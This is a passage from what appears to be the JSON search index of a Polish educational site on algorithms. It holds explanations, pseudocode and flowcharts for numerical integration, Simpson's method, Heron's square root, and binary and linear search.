STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/monte-carlo/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/numerical-methods/monte-carlo/#c","title":"C++","text":""},{"location":"algorithms/numerical-methods/monte-carlo/#python","title":"Python","text":""},{"location":"algorithms/numerical-methods/monte-carlo/#julia","title":"Julia","text":""},{"location":"algorithms/numerical-methods/numerical-integration/","title":"Ca\u0142kowanie numeryczne","text":"<p>Has\u0142o \"ca\u0142kowanie numeryczne\" mo\u017ce brzmie\u0107 strasznie, ale samo poj\u0119cie jest do\u015b\u0107 proste do zrozumienia. To nic innego, ni\u017c policzenie pola pod wykresem funkcji w zadanym przedziale. Oczywi\u015bcie w og\u00f3lno\u015bci to zadanie jest do\u015b\u0107 skomplikowane obliczeniowo, dlatego tutaj skupimy si\u0119 na przybli\u017ceniu tej warto\u015bci.</p> <p>Wyr\u00f3\u017cniamy dwie podstawowe metody: metod\u0119 prostok\u0105t\u00f3w i metod\u0119 trapez\u00f3w.</p>"},{"location":"algorithms/numerical-methods/numerical-integration/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#dane","title":"Dane","text":"<ul> <li>\\(f(x)\\) \u2014 funkcja, kt\u00f3rej wykres nas interesuje</li> <li>\\(a\\) \u2014 liczba rzeczywista, pocz\u0105tek przedzia\u0142u</li> <li>\\(b\\) \u2014 liczba rzeczywista, koniec przedzia\u0142u</li> <li>\\(n\\) \u2014 liczba podzia\u0142\u00f3w (im wi\u0119ksza, tym wi\u0119ksza dok\u0142adno\u015b\u0107)</li> </ul>"},{"location":"algorithms/numerical-methods/numerical-integration/#wynik","title":"Wynik","text":"<ul> <li>\\(pole\\) \u2014 przybli\u017cona warto\u015b\u0107 pola pod wykresem funkcji \\(f(x)\\) w przedziale \\([a,b]\\)</li> </ul>"},{"location":"algorithms/numerical-methods/numerical-integration/#rozwiazanie-metoda-prostokatow","title":"Rozwi\u0105zanie \u2014 metoda prostok\u0105t\u00f3w","text":"<p>Idea tej metody jest prosta: podzielmy pole pod wykresem funkcji na prostok\u0105ty i policzmy ich pole.</p>"},{"location":"algorithms/numerical-methods/numerical-integration/#wizualizacja","title":"Wizualizacja","text":"<p>Zobaczmy, jak ta metoda dzia\u0142a na przyk\u0142adzie. Spr\u00f3bujmy oszacowa\u0107 pole pod wykresem funkcji sinus na przedziale od \\(0\\) do \\(\\pi\\).</p>"},{"location":"algorithms/numerical-methods/numerical-integration/#20-prostokatow","title":"20 prostok\u0105t\u00f3w","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#50-prostokatow","title":"50 prostok\u0105t\u00f3w","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#100-prostokatow","title":"100 prostok\u0105t\u00f3w","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja MetodaProstokatow(f, a, b, n):\n    1. pole := 0\n    2. szer := (b - a) / n\n    3. x := a + szer\n\n    4. Dop\u00f3ki x &lt;= b, wykonuj:\n        5. wys := f(x)\n        6. pole := pole + szer * wys\n        7. x := x + szer\n\n    8. Zwr\u00f3\u0107 pole\n</code></pre>"},{"location":"algorithms/numerical-methods/numerical-integration/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"MetodaProstokatow(f, a, b, n)\"]) --&gt; K1[\"pole := 0\n    szer := (b - a) / n\n    x := a + szer\"]\n    K1 --&gt; K4{x &lt;= b}\n    K4 -- PRAWDA --&gt; K5[\"wys := f(x)\n    pole := pole + szer * wys\n    x := x + szer\"]\n    K5 --&gt; K4\n    K4 -- FA\u0141SZ --&gt; K8[/Zwr\u00f3\u0107 pole/]\n    K8 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/numerical-integration/#rozwiazanie-metoda-trapezow","title":"Rozwi\u0105zanie \u2014 metoda trapez\u00f3w","text":"<p>W celu uzyskania lepszej dok\u0142adno\u015bci, mo\u017cemy podzieli\u0107 pole pod wykresem funkcji na trapezy.</p>"},{"location":"algorithms/numerical-methods/numerical-integration/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja MetodaTrapezow(f, a, b, n):\n    1. pole := 0\n    2. szer := (b - a) / n\n    3. x := a + szer\n\n    4. Dop\u00f3ki x &lt;= b, wykonuj:\n        5. pole := pole + ((f(x - szer) + f(x)) * szer) / 2\n        6. x := x + szer\n\n    7. Zwr\u00f3\u0107 pole\n</code></pre>"},{"location":"algorithms/numerical-methods/numerical-integration/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"MetodaTrapezow(f, a, b, n)\"]) --&gt; K1[\"pole := 0\n    szer := (b - a) / n\n    x := a + szer\"]\n    K1 --&gt; K4{x &lt;= b}\n    K4 -- PRAWDA --&gt; K5[\"pole := pole + ((f(x - szer) + f(x)) * szer) / 2\n    x := x + szer\"]\n    K5 --&gt; K4\n    K4 -- FA\u0141SZ --&gt; K8[/Zwr\u00f3\u0107 pole/]\n    K8 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/numerical-integration/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#c","title":"C++","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#python","title":"Python","text":""},{"location":"algorithms/numerical-methods/numerical-integration/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/numerical-methods/simpson-integration/","title":"Metoda Simpsona","text":"<p>Metoda Simpsona jest bardziej zaawansowan\u0105 technik\u0105 ca\u0142kowania numerycznego, kt\u00f3ra pozwala na uzyskanie dok\u0142adniejszych wynik\u00f3w ni\u017c metody prostok\u0105t\u00f3w i trapez\u00f3w. Polega ona na przybli\u017ceniu funkcji za pomoc\u0105 parabol, a nast\u0119pnie obliczeniu pola pod tymi parabolami.</p>"},{"location":"algorithms/numerical-methods/simpson-integration/#wzor","title":"Wz\u00f3r","text":"<p>Wz\u00f3r metody Simpsona dla przedzia\u0142u \\([a, b]\\) z \\(n\\) podprzedzia\u0142ami (gdzie \\(n\\) jest parzyste) jest nast\u0119puj\u0105cy:</p> \\[ \\int_{a}^{b} f(x) \\, dx \\approx \\frac{h}{3} \\left[ f(a) + 4 \\sum_{k=1}^{n/2} f(a + (2k-1)h) + 2 \\sum_{k=1}^{n/2-1} f(a + 2kh) + f(b) \\right] \\] <p>gdzie:</p> <ul> <li>\\(h = (b - a) / n\\) jest szeroko\u015bci\u0105 podprzedzia\u0142u,</li> <li>\\(\\sum_{k=1}^{n/2}\\) oznacza sumowanie dla \\(k\\) od \\(1\\) do \\(n/2\\).</li> </ul>"},{"location":"algorithms/numerical-methods/simpson-integration/#podzia-przedziau","title":"Podzia\u0142 przedzia\u0142u","text":"<ol> <li>Dzielimy przedzia\u0142 \\([a, b]\\) na \\(n\\) r\u00f3wnych podprzedzia\u0142\u00f3w, gdzie \\(n\\) jest parzyste.</li> <li>Ka\u017cdy podprzedzia\u0142 ma szeroko\u015b\u0107 \\(h\\).</li> </ol>"},{"location":"algorithms/numerical-methods/simpson-integration/#obliczanie-caek-na-kolejnych-fragmentach","title":"Obliczanie ca\u0142ek na kolejnych fragmentach","text":"<ol> <li>Obliczamy warto\u015bci funkcji \\(f(x)\\) w punktach \\(a, a + h, a + 2h, \\dots, b\\).</li> <li>Sumujemy warto\u015bci funkcji w punktach ko\u0144cowych przedzia\u0142u (\\(a\\) i \\(b\\)), punktach \u015brodkowych (\\(a + (2k-1)h\\)) z wag\u0105 \\(4\\) oraz punktach wewn\u0119trznycha (\\(a+2kh\\)) z wag\u0105 \\(2\\).</li> </ol>"},{"location":"algorithms/numerical-methods/simpson-integration/#aczenie-caego-wyniku","title":"\u0141\u0105czenie ca\u0142ego wyniku","text":"<p>Mno\u017cymy sum\u0119 przez \\(h/3\\), aby uzyska\u0107 przybli\u017con\u0105 warto\u015b\u0107 ca\u0142ki oznaczonej.</p>"},{"location":"algorithms/numerical-methods/simpson-integration/#bad-dokadnosci","title":"B\u0142\u0105d dok\u0142adno\u015bci","text":"<p>B\u0142\u0105d przybli\u017cenia warto\u015bci ca\u0142ki metod\u0105 Simpsona jest rz\u0119du \\(O(h^4)\\). W praktyce oznacza to, \u017ce metoda Simpsona jest bardzo dok\u0142adna dla funkcji, kt\u00f3re s\u0105 dobrze przybli\u017cane przez parabol\u0119 na ma\u0142ych przedzia\u0142ach. Jednak\u017ce, dla funkcji o du\u017cych zmianach krzywizny, b\u0142\u0105d mo\u017ce by\u0107 wi\u0119kszy.</p>"},{"location":"algorithms/numerical-methods/simpson-integration/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numerical-methods/simpson-integration/#dane","title":"Dane","text":"<ul> <li>\\(f(x)\\) \u2014 funkcja, kt\u00f3rej wykres nas interesuje</li> <li>\\(a\\) \u2014 pocz\u0105tek przedzia\u0142u, \\(a\\in\\mathbb{R}\\)</li> <li>\\(b\\) \u2014 koniec przedzia\u0142u, \\(b\\in\\mathbb{R}\\)</li> <li>\\(n\\) \u2014 parzysta liczba podzia\u0142\u00f3w (im wi\u0119ksza, tym wi\u0119ksza dok\u0142adno\u015b\u0107), \\(n\\in\\mathbb{N}\\)</li> </ul>"},{"location":"algorithms/numerical-methods/simpson-integration/#wynik","title":"Wynik","text":"<ul> <li>\\(pole\\) \u2014 przybli\u017cona warto\u015b\u0107 pola pod wykresem funkcji \\(f(x)\\) w przedziale \\([a,b]\\) (tzn. przybli\u017cona warto\u015b\u0107 \\(\\int_{a}^{b} f(x) \\, dx\\))</li> </ul>"},{"location":"algorithms/numerical-methods/simpson-integration/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Zaczynamy od obliczenia szeroko\u015bci pojedynczego przedzia\u0142u jako \\(\\frac{b-a}{n}\\). Jako pocz\u0105tkow\u0105 warto\u015b\u0107 przybli\u017conego pola przyjmujemy sum\u0119 warto\u015bci funkcji na kra\u0144cach przedzia\u0142u, tzn. \\(f(a) + f(b)\\). Nast\u0119pnie przechodzimy przez kolejne przedzia\u0142y od \\(1\\) do \\(n-1\\). Obliczamy punkt \\(x\\) jako pocz\u0105tek zakresu plus numer przedzia\u0142u przemno\u017cony przez szeroko\u015b\u0107 przedzia\u0142u. Dodajemy do obliczanego pola warto\u015b\u0107 funkcji w punkcie \\(x\\) z wag\u0105 \\(2\\) lub \\(4\\), w zale\u017cno\u015bci od parzysto\u015bci numeru przedzia\u0142u (\\(2\\) dla parzystego, \\(4\\) dla nieparzystego). Po przej\u015bciu przez wszystkie przedzia\u0142y zwracamy jako wynik warto\u015b\u0107 pola przemno\u017con\u0105 przez szeroko\u015b\u0107 pojedynczego przedzia\u0142u podzielon\u0105 przez trzy.</p>"},{"location":"algorithms/numerical-methods/simpson-integration/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja MetodaSimpsona(f, a, b, n):\n    1. szer := (b - a) / n\n    2. pole := f(a) + f(b)\n\n    3. Dla i od 1 do n-1, wykonuj:\n        4. x := a + i * szer\n        5. je\u017celi i jest parzyste, pole := pole + 2 * f(x)\n        6. je\u017celi i jest nieparzyste, pole := pole + 4 * f(x)\n\n    7. pole := pole * szer / 3\n    8. Zwr\u00f3\u0107 pole\n</code></pre>"},{"location":"algorithms/numerical-methods/simpson-integration/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"MetodaSimpsona(f, a, b, n)\"]) --&gt; K2[\"szer := (b - a) / n\n    pole := f(a) + f(b)\"]\n    K2 --&gt; K4[\"Dla i od 1 do n-1, wykonuj\"]\n    K4 --&gt; K5[\"x := a + i * szer\"]\n    K5 --&gt; K6{\"i jest parzyste?\"}\n    K6 -- TAK --&gt; K7[\"pole := pole + 2 * f(x)\"]\n    K6 -- NIE --&gt; K8[\"pole := pole + 4 * f(x)\"]\n    K7 --&gt; K4\n    K8 --&gt; K4\n    K4 --&gt;|koniec| K9[\"pole := pole * szer / 3\"]\n    K9 --&gt; K10[/Zwr\u00f3\u0107 pole/]\n    K10 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/simpson-integration/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/numerical-methods/simpson-integration/#c","title":"C++","text":""},{"location":"algorithms/numerical-methods/simpson-integration/#python","title":"Python","text":""},{"location":"algorithms/numerical-methods/square-root/","title":"Pierwiastek kwadratowy","text":"<p>Jak policzy\u0107 pierwiastek kwadratowy z podanej liczby, gdy nie mamy przy sobie kalkulatora, ani wbudowanych metod programistycznych?</p>"},{"location":"algorithms/numerical-methods/square-root/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numerical-methods/square-root/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba do spierwiastkowania, \\(n\\in\\mathbb{R}\\)</li> <li>\\(p\\) \u2014 oczekiwana dok\u0142adno\u015b\u0107 oblicze\u0144, \\(p\\in\\mathbb{R}\\)</li> </ul>"},{"location":"algorithms/numerical-methods/square-root/#wynik","title":"Wynik","text":"<ul> <li>\\(\\sqrt{n}\\) policzony z dok\u0142adno\u015bci\u0105 \\(p\\)</li> </ul>"},{"location":"algorithms/numerical-methods/square-root/#rozwiazanie-metoda-herona","title":"Rozwi\u0105zanie \u2014 metoda Herona","text":""},{"location":"algorithms/numerical-methods/square-root/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja MetodaHerona(n, p)\n    1. x1 := n / 2\n    2. x2 := (x1 + (n / x1)) / 2\n    3. Dop\u00f3ki |x2 - x1| &gt; p, wykonuj:\n        4. x1 := (x2 + (n / x2)) / 2\n        3. Zamie\u0144(x1, x2)\n    4. Zwr\u00f3\u0107 x2\n</code></pre>"},{"location":"algorithms/numerical-methods/square-root/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"MetodaHerona(n, p)\"]) --&gt; K1[\"x1 := n / 2\n    x2 := (x1 + (n / x1)) / 2\"]\n    K1 --&gt; K3{\"|x2 - x1| &gt; p\"}\n    K3 -- PRAWDA --&gt; K4[\"x1 := (x2 + (n / x2)) / 2\n    Zamie\u0144(x1, x2)\"]\n    K4 --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K6[/Zwr\u00f3\u0107 x2/]\n    K6 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/square-root/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/numerical-methods/square-root/#c","title":"C++","text":""},{"location":"algorithms/numerical-methods/square-root/#python","title":"Python","text":""},{"location":"algorithms/oop/","title":"Programowanie obiektowe","text":""},{"location":"algorithms/oop/#wstep","title":"Wst\u0119p","text":"<p>Programowanie obiektowe jest jednym z popularnych paradygmat\u00f3w programowania. W skr\u00f3cie polega to na tym, \u017ce pracujemy z tzw. obiektami, kt\u00f3re s\u0105 zdefiniowane za pomoc\u0105 klas. Klasy definiuj\u0105 nam nowe typy, kt\u00f3re w przeciwie\u0144stwie do typ\u00f3w prostych (np. <code>int</code>), mog\u0105 mie\u0107 swoje w\u0142a\u015bciwo\u015bci (atrybuty) i metody.</p> <p>Istota programowania obiektowego jest w zasadzie prosta do zrozumienia.  Wyobra\u017amy sobie takie jab\u0142ko. Jab\u0142ko jest obiektem, kt\u00f3ry mo\u017cemy zdefiniowa\u0107 poprzez jego wymiary, wag\u0119, kolor, dat\u0119 zerwania, gatunek itp. Spos\u00f3b opisu takiego jab\u0142ka nazwiemy klas\u0105, a konkretne jab\u0142ko, z ustalonymi wymiarami i innymi w\u0142a\u015bciwo\u015bciami, b\u0119dzie obiektem tej klasy.</p>"},{"location":"algorithms/searching/","title":"Wyszukiwanie","text":"<p>Algorytmy wyszukiwania s\u0105 nieod\u0142\u0105cznym elementem informatyki, stosowane do odnajdywania danych w\u015br\u00f3d zestaw\u00f3w informacji. S\u0105 one podstaw\u0105 dla wielu aplikacji, od prostych funkcji wyszukiwania w bazach danych po zaawansowane systemy wyszukiwania w Internecie. Ka\u017cdy z nas codziennie korzysta z algorytm\u00f3w wyszukiwania, cz\u0119sto nawet o tym nie wiedz\u0105c. Gdy wyszukujemy informacji w Internecie, korzystamy z zaawansowanych algorytm\u00f3w, kt\u00f3re pomagaj\u0105 nam znale\u017a\u0107 to, czego szukamy w ogromnej ilo\u015bci danych dost\u0119pnych online. Mi\u0119dzy innymi w\u0142a\u015bnie dlatego algorytmy wyszukiwania s\u0105 kluczowe dla efektywno\u015bci wielu system\u00f3w informatycznych. Szybko\u015b\u0107 i dok\u0142adno\u015b\u0107 wyszukiwania maj\u0105 bezpo\u015bredni wp\u0142yw na wydajno\u015b\u0107 aplikacji. Na przyk\u0142ad, szybkie i skuteczne wyszukiwanie w bazach danych jest kluczowe dla dzia\u0142ania du\u017cych system\u00f3w informatycznych, takich jak serwisy internetowe czy systemy zarz\u0105dzania klientami.</p> <p>W tej sekcji poznamy r\u00f3\u017cne algorytmy wyszukiwania i ich zastosowania.</p>"},{"location":"algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":"<p>W wielu przypadkach, gdy musimy co\u015b znale\u017a\u0107, np. ksi\u0105\u017ck\u0119 na p\u00f3\u0142ce w bibliotece, to b\u0119dziemy mie\u0107 do czynienia z konkretnym porz\u0105dkiem. Ksi\u0105\u017cki mog\u0105 by\u0107 u\u0142o\u017cone wed\u0142ug tematyki, posortowane po nazwisku autora i tytule. Znacz\u0105co u\u0142atwia to znalezienie po\u017c\u0105danej pozycji, poniewa\u017c wiemy, gdzie szuka\u0107.</p> <p>Tak samo jest te\u017c w \u015bwiecie algorytmiki. Gdy pracujemy na danych posortowanych, to zazwyczaj mo\u017cemy skonstruowa\u0107 efektywne algorytmy do rozwi\u0105zania problemu. </p> <p>Zacznijmy od tanecznego wyszukiwania i formalnej specyfikacji, by lepiej zrozumie\u0107 problem, z kt\u00f3rym b\u0119dziemy si\u0119 mierzy\u0107.</p>"},{"location":"algorithms/searching/binary-search/#taneczne-wyszukiwanie","title":"Taneczne wyszukiwanie","text":"<p> Taneczne wyszukiwanie binarne</p>"},{"location":"algorithms/searching/binary-search/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/binary-search/#dane","title":"Dane:","text":"<ul> <li>\\(n\\) - liczba naturalna, ilo\u015b\u0107 element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) - \\(n-elementowa\\) tablica liczb ca\u0142kowitych, posortowana niemalej\u0105co, indeksowana od jedynki</li> <li>\\(k\\) - liczba ca\u0142kowita, szukana warto\u015b\u0107</li> </ul>"},{"location":"algorithms/searching/binary-search/#wynik","title":"Wynik:","text":"<ul> <li>Indeks warto\u015bci \\(k\\) w tablicy \\(A\\), lub \\(-1\\) je\u017celi tej warto\u015bci nie ma w tablicy</li> </ul>"},{"location":"algorithms/searching/binary-search/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/binary-search/#dane_1","title":"Dane","text":"<pre><code>n := 5\nA := [1, 2, 5, 7, 9]\nk := 7 \n</code></pre> <p>Wynik: \\(4\\) </p>"},{"location":"algorithms/searching/binary-search/#rozwiazanie-iteracyjne","title":"Rozwi\u0105zanie iteracyjne","text":"<p>Zacznijmy od wersji iteracyjnej. Na pocz\u0105tku definiujemy pocz\u0105tek i koniec przeszukiwanego przedzia\u0142u. Jako pocz\u0105tek przyjmujemy numer pierwszego elementu (czyli \\(1\\)), a jako koniec numer ostatniego elementu (czyli \\(n\\)). W p\u0119tli b\u0119dziemy powtarza\u0107 przeszukiwanie tak d\u0142ugo, jak d\u0142ugo nasz zdefiniowany przez pocz\u0105tek i koniec przedzia\u0142 b\u0119dzie zawiera\u0142 co najmniej jeden element. Inaczej m\u00f3wi\u0105c, powtarzamy tak d\u0142ugo, jak d\u0142ugo pocz\u0105tek jest mniejszy od ko\u0144ca.</p> <p>Wewn\u0105trz p\u0119tli najpierw obliczamy \u015brodek przeszukiwanego przedzia\u0142u. Nast\u0119pnie sprawdzamy, jak element znajduj\u0105cy si\u0119 na \u015brodku ma si\u0119 do naszego poszukiwanego elementu. Je\u017celi poszukiwane element jest wi\u0119kszy od elementu, kt\u00f3ry mamy na \u015brodku, to znaczy, \u017ce nale\u017cy szuka\u0107 po prawej stronie od \u015brodka: przesuwamy wi\u0119c pocz\u0105tek naszego przedzia\u0142u na prawo od \u015brodka. W przeciwnym przypadku, czyli gdy poszukiwany element jest mniejszy b\u0105d\u017a r\u00f3wny elementowi na \u015brodku, oznacza to, \u017ce nale\u017cy szuka\u0107 po lewej stronie od \u015brodka (ale nie mo\u017cemy wykluczy\u0107 te\u017c elementu na \u015brodku!). W zwi\u0105zku z tym przesuwamy koniec przedzia\u0142u na \u015brodek. </p> <p>Gdy ju\u017c wyjdziemy z p\u0119tli pozostaje nam sprawdzi\u0107, czy znale\u017ali\u015bmy poszukiwany element. Sprawdzamy, czy pod indeksem wskazuj\u0105cym na zmieniony pocz\u0105tek (lub koniec) przedzia\u0142u znajduje si\u0119 poszukiwana warto\u015b\u0107. Je\u017celi tak, to zwracamy jako wynik ten indeks. W przeciwnym przypadku zwracamy \\(-1\\).</p>"},{"location":"algorithms/searching/binary-search/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzukajBinarnie(n, A, k)\n    1. pocz := 1\n    2. kon := n\n    3. Dop\u00f3ki pocz &lt; kon, wykonuj:\n        4. srodek := (pocz + kon) div 2\n\n        5. Je\u017celi k &gt; A[srodek], to:\n            6. pocz := srodek + 1\n\n        7. W przeciwnym przypadku:\n            8. kon := srodek\n\n    9. Je\u017celi A[pocz] = k, to:\n        10. Zwr\u00f3\u0107 pocz, zako\u0144cz\n    11. W przeciwnym przypadku:\n        12. Zwr\u00f3\u0107 -1, zako\u0144cz\n</code></pre> <p>Info</p> <p>div oznacza dzielenie ca\u0142kowite</p>"},{"location":"algorithms/searching/binary-search/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajBinarnie(n, A, k)\"]) --&gt; O1[\"pocz := 1\n    kon := n\"]\n    O1 --&gt; C1{pocz &lt; kon}\n    C1 -- PRAWDA --&gt; O2[\"srodek := (pocz + kon) div 2\"]\n    O2 --&gt; C2{\"k &gt; A[srodek]\"}\n    C2 -- PRAWDA --&gt; O3[pocz := srodek + 1]\n    O3 --&gt; C1\n    C2 -- FA\u0141SZ --&gt; O4[kon := srodek]\n    O4 --&gt; C1\n    C1 -- FA\u0141SZ --&gt; C3{\"A[pocz] = k\"}\n    C3 -- PRAWDA --&gt; R1[/Zwr\u00f3\u0107 pocz/]\n    R1 --&gt; STOP([STOP])\n    C3 -- FA\u0141SZ --&gt; R2[/Zwr\u00f3\u0107 -1/]\n    R2 --&gt; STOP</code></pre>"},{"location":"algorithms/searching/binary-search/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\log n)\\) - logarytmiczna</p>"},{"location":"algorithms/searching/binary-search/#rozwiazanie-rekurencyjne","title":"Rozwi\u0105zanie rekurencyjne","text":"<p>W rozwi\u0105zaniu rekurencyjnym zamiast rozmiaru tablicy podajemy pocz\u0105tek i koniec przeszukiwanego przedzia\u0142u. Zaczynamy od sprawdzenia warunku stopu rekurencji: poprawno\u015bci przedzia\u0142u. Nast\u0119pnie post\u0119pujemy podobnie jak w wersji iteracyjnej. Obliczamy \u015brodek przedzia\u0142u i por\u00f3wnujemy element znajduj\u0105cy si\u0119 na \u015brodku z poszukiwan\u0105 warto\u015bci\u0105. W zale\u017cno\u015bci od wyniku por\u00f3wnania wykonujemy wywo\u0142anie rekurencyjne odpowiednio modyfikuj\u0105c przeszukiwany przedzia\u0142.</p>"},{"location":"algorithms/searching/binary-search/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja SzukajBinarnie(A, k, pocz, kon)\n    1. Je\u017celi pocz &gt;= kon, to:\n        2. Je\u017celi A[pocz] == k, to:\n            3. Zwr\u00f3\u0107 pocz, zako\u0144cz\n        4. W przeciwnym przypadku:\n            5. Zwr\u00f3\u0107 -1, zako\u0144cz\n\n    6. srodek := (pocz + kon) div 2\n\n    7. Je\u017celi k &gt; A[srodek], to:\n        8. Zwr\u00f3\u0107 SzukajBinarnie(A, k, srodek+1, kon)\n\n    9. W przeciwnym przypadku:\n        10. Zwr\u00f3\u0107 SzukajBinarnie(A, k, pocz, srodek)\n</code></pre>"},{"location":"algorithms/searching/binary-search/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajBinarnie(A, k, pocz, kon)\"]) --&gt; K1{pocz &gt;= kon}\n    K1 -- PRAWDA --&gt; K2{\"A[pocz] = k\"}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 pocz/]\n    K3 --&gt; STOP([STOP])\n    K2 -- FA\u0141SZ --&gt; K5[/Zwr\u00f3\u0107 -1/]\n    K5 --&gt; STOP\n    K1 -- FA\u0141SZ --&gt; K6[\"srodek := (pocz + kon) div 2\"]\n    K6 --&gt; K7{\"k &gt; A[srodek]\"}\n    K7 -- PRAWDA --&gt; K8[/\"Zwr\u00f3\u0107 SzukajBinarnie(A, k, srodek + 1, kon)\"/]\n    K8 --&gt; STOP\n    K7 -- FA\u0141SZ --&gt; K9[/\"Zwr\u00f3\u0107 SzukajBinarnie(A, k, pocz, srodek)\"/]\n    K9 --&gt; STOP</code></pre>"},{"location":"algorithms/searching/binary-search/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\log n)\\) - logarytmiczna</p>"},{"location":"algorithms/searching/binary-search/#implementacje-gowne","title":"Implementacje - g\u0142\u00f3wne","text":""},{"location":"algorithms/searching/binary-search/#c","title":"C++","text":""},{"location":"algorithms/searching/binary-search/#python","title":"Python","text":""},{"location":"algorithms/searching/binary-search/#blockly","title":"Blockly","text":""},{"location":"algorithms/searching/binary-search/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/binary-search/#_1","title":"Wyszukiwanie binarne","text":""},{"location":"algorithms/searching/binary-search/#haskell","title":"Haskell","text":""},{"location":"algorithms/searching/binary-search/#julia","title":"Julia","text":""},{"location":"algorithms/searching/binary-search/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/binary-search/#powiazane-zagadnienia","title":"Powi\u0105zane zagadnienia","text":"<ul> <li>Obliczanie pierwiastka kwadratowego zadanej liczby.</li> <li>Znajdowanie najmniejszego i najwi\u0119kszego indeksu danej liczby w posortowanej tablicy, w kt\u00f3rej elementy mog\u0105 si\u0119 powtarza\u0107.</li> <li>Znajdowanie mediany dw\u00f3ch posortowanych tablic (gdyby by\u0142y ze sob\u0105 scalone w jedn\u0105 posortowan\u0105 tablic\u0119).</li> </ul>"},{"location":"algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":"<p>Wyobra\u017amy sobie p\u00f3\u0142k\u0119 z ksi\u0105\u017ckami. Ksi\u0105\u017cki na p\u00f3\u0142ce u\u0142o\u017cone s\u0105 w losowej kolejno\u015bci, nie zachowuj\u0105c \u017cadnego sensownego porz\u0105dku. Innymi s\u0142owy: s\u0105 nieuporz\u0105dkowane. Naszym zadaniem jest znale\u017a\u0107 jedn\u0105 konkretn\u0105 ksi\u0105\u017ck\u0119. Znamy jej tytu\u0142, znamy autora. Jak si\u0119 do tego zabra\u0107?</p> <p>Je\u017celi nie chcemy po\u015bwi\u0119ca\u0107 na to zadanie wi\u0119cej czasu ni\u017c to konieczne i porz\u0105dkowa\u0107 ksi\u0105\u017cek przed przyst\u0105pieniem do przeszukiwania, to rozwi\u0105zanie jest proste. Musimy sprawdzi\u0107 ka\u017cd\u0105 kolejn\u0105 ksi\u0105\u017ck\u0119. Mo\u017cemy to robi\u0107 w spos\u00f3b losowy i liczy\u0107 na to, \u017ce nam si\u0119 poszcz\u0119\u015bci, albo lepiej, w spos\u00f3b uporz\u0105dkowany. Sprawdzamy wi\u0119c ksi\u0105\u017cki jedna po drugiej, od lewej do prawej (lub od prawej do lewej, jak kto woli) a\u017c natrafimy na t\u0105 poszukiwan\u0105. I to jest w\u0142a\u015bnie wyszukiwanie liniowe.</p> <p>Oczywi\u015bcie na komputerze nie b\u0119dziemy przeszukiwa\u0107 ksi\u0105\u017cek (chocia\u017c czasem i to robimy), tylko zajmiemy si\u0119 przeszukiwaniem tablicy element\u00f3w w poszukiwaniu konkretnej, zadanej warto\u015bci.</p> <p>Istnieje oczywi\u015bcie kilka wersji tego problemu. Zacznijmy od pierwszej z nich, by\u0107 mo\u017ce najprostszej.</p>"},{"location":"algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":"<p>Jedn\u0105 z najprostszych wersji problemu wyszukiwania jest sprawdzenie, czy dany element istnieje w zbiorze. Wyobra\u017amy sobie, \u017ce jeste\u015bmy w sklepie i pytamy ekspedienta, czy jest mleko. Ekspedient przegl\u0105da dost\u0119pne produkty i odpowiada: tak lub nie. W takim przypadku interesuje nas tylko to, czy mleko w og\u00f3le jest aktualnie w sprzeda\u017cy, nie to ile sztuk mleka jest dost\u0119pnych, czy te\u017c gdzie si\u0119 ten produkt znajduje.</p> <p>Naszym celem b\u0119dzie 